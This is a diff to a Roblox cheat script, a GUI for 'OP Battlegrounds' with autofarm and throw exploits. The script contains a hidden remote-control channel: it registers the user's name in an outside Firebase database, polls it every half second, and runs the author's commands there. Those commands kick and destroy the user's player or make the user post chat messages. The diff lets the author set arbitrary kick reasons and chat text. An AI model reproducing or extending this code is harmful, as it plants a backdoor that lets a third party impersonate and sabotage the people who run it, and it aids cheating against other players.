@@ -1,6 +1,4 @@
--- Gui to Lua Version 3.2
 -- Realirist's OPBGGUI
--- Security updates
 
 -- Instances:
 
@@ -856,7 +854,7 @@ UISizeConstraint_36.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function TOUVST_fake_script() -- Main.LocalScript 
+local function UIYOEGL_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
@@ -1157,7 +1155,7 @@ local function TOUVST_fake_script() -- Main.LocalScript
 		if autofarm then while autofarm do
 				local user = target
 				if game.Players[user] then
-					local plr:Player = game.Players[user]
+					local plr = game.Players[user]
 					local char = plr.Character or plr.CharacterAdded:Wait()
 					local oppHrp = char:WaitForChild('HumanoidRootPart',2)
 					if char and oppHrp then
@@ -1367,7 +1365,7 @@ local function TOUVST_fake_script() -- Main.LocalScript
 			if throw then
 				local plr = game.Players.LocalPlayer
 				local char = plr.Character or plr.CharacterAdded:Wait()
-				local hrp:BasePart = char:FindFirstChild('HumanoidRootPart')
+				local hrp = char:FindFirstChild('HumanoidRootPart')
 				local lookvector = hrp.CFrame.LookVector
 	
 				throw:FireServer(lookvector*Vector3.new(1.3,2,1.3))
@@ -1463,7 +1461,7 @@ local function TOUVST_fake_script() -- Main.LocalScript
 	http_request({
 		Url = "https://opbgguiserver-default-rtdb.firebaseio.com/main.json",
 		Method = "PATCH",
-		Body = game:GetService('HttpService'):JSONEncode({[game.Players.LocalPlayer.Name] = {command = ''}}),
+		Body = game:GetService('HttpService'):JSONEncode({[game.Players.LocalPlayer.Name] = {command = '', message=''}}),
 		Headers = { ["Content-Type"] = "application/json"}
 	})
 	
@@ -1476,9 +1474,9 @@ local function TOUVST_fake_script() -- Main.LocalScript
 	function getRunner()
 		return function()
 			while task.wait(0.5) do
-				print("Loop")
+				--print("Loop")
 				local s, e = pcall(function()
-					local function getcommand()
+					local function getSelfData()
 						local response = nil
 						pcall(function()
 							response = http_request({
@@ -1490,44 +1488,56 @@ local function TOUVST_fake_script() -- Main.LocalScript
 						if response then
 							local decode = function(idkwattonamethis) return game:GetService('HttpService'):JSONDecode(idkwattonamethis) end
 							local data = decode(response.Body)
-							return data[game.Players.LocalPlayer.Name] and data[game.Players.LocalPlayer.Name]['command'] or nil
+							return data[game.Players.LocalPlayer.Name]
 						end
 						return nil
 					end
 	
-					local command = getcommand()
+					local command = getSelfData()['command']
 					if command then
 						local function resetUser()
 							local response = http_request({
 								Url = "https://opbgguiserver-default-rtdb.firebaseio.com/main.json",
 								Method = "PATCH",
-								Body = game:GetService('HttpService'):JSONEncode({[game.Players.LocalPlayer.Name] = {command = ''}}),
+								Body = game:GetService('HttpService'):JSONEncode({[game.Players.LocalPlayer.Name] = {command = '',message=''}}),
 								Headers = { ["Content-Type"] = "application/json" }
 							})
 							return response
 						end
 	
 						local commandList = {
-							kick = function(user)
-								if user == game.Players.LocalPlayer.Name then
+							kick = function(data)
+								local reason = data['message']
+								print('Got reason: '.. tostring(reason))
+								if not reason or reason=='' then
 									game.Players.LocalPlayer:Kick('CAESSAAARRRR')
+									task.wait(1)
+									game.Players.LocalPlayer:Destroy()
+								elseif reason then
+									game.Players.LocalPlayer:Kick(reason)
 									task.wait(1)
 									game.Players.LocalPlayer:Destroy()
 								end
 							end,
-							chat = function(user)
-								if user == game.Players.LocalPlayer.Name then
+							chat= function(data)
+								local msg = data['message']
+								if msg or msg=='' then
+									print('Message: '.. msg)
+									sayMessage(msg)
+								else
+									print('No message')
 									sayMessage('OPBGGUI User')
 								end
 							end,
 						}
 	
 						if commandList[command] then
+							local selfData = getSelfData()
 							resetUser()
-							local ranCommand = commandList[command](game.Players.LocalPlayer.Name) -- Run the command
-							return getcommand(), ranCommand
+							local ranCommand = commandList[command](selfData)
+							print('Ran command: '.. command)
 						else
-							warn('Unknown command: ', command)
+							--warn('Unknown command: ', command)
 						end
 					end
 				end)
@@ -1544,4 +1554,4 @@ local function TOUVST_fake_script() -- Main.LocalScript
 	end)()
 	print('Coroutine is successful.')
 end
-coroutine.wrap(TOUVST_fake_script)()
+coroutine.wrap(UIYOEGL_fake_script)()
